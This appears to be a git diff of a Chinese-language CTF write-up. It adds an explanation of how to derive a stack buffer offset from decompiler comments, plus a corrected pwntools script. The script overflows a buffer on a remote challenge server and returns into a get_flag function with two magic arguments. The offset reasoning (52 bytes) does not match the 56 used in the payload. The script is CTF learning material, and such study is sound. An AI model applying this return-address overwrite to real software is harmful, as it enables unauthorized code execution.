@@ -65,9 +65,39 @@ r.interactive()
 
 <img width="725" height="64" alt="image" src="https://github.com/user-attachments/assets/79e04528-86e2-4dda-8ea1-9574d6e32af0" />
 
-发现重点
+发现重点char v4[56]; // [esp+4h] [ebp-38h]
 
-char 变量名[大小]; // [相对于esp的位置] [相对于ebp的位置或栈帧边界]
+> [!NOTE]
+>[ebp-38h]:说明函数开头执行了sub esp, 38h，此时 ebp 和 esp 的距离是 56 字节
+>
+> [esp+4h]:说明变量 v4 (buf) 的起始地址不是 esp，而是 esp + 4
+>
+> 真正的 Offset 计算：
+> 
+> ebp 到 esp 的距离 = 0x38 (56 字节)
+>
+> buf 从 esp + 4 开始，所以 buf 到 ebp 的距离 = 56 - 4 = 52 字节
+> 
+
+> [!IMPORTANT]
+> char 变量名[大小]; // [相对于esp的位置] [相对于ebp的位置或栈帧边界]
+>
+
+改过后
+```
+from pwn import *
+r=remote("e5c447c1493e667a673dfb4d.tcp-ctf2.dasctf.com", 9999, ssl=True)
+
+get_flag=0x080489A0
+a1=0x308CD64F
+a2=0x195719D1
+exit=0x0804E6A0
+
+payload=b"a"*56+p32(get_flag)+p32(exit)+p32(a1)+p32(a2)
+r.sendline(payload)
+
+r.interactive()
+```
 
 获得flag
 
